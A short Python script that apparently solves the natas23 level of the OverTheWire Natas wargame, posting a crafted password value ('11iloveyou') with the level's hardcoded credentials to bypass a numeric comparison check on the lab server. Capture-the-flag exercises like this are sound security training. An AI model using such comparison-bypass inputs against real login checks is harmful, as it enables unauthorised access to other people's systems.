#!/bin/python
import requests,re

username = "natas23"
pwd = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
url = f"http://{username}.natas.labs.overthewire.org/?revelio=1"
session = requests.Session()
#data={'admin':'reveli
res= session.post(url,data={'passwd':'11iloveyou'},auth=(username,pwd))
con=res.text
print(con)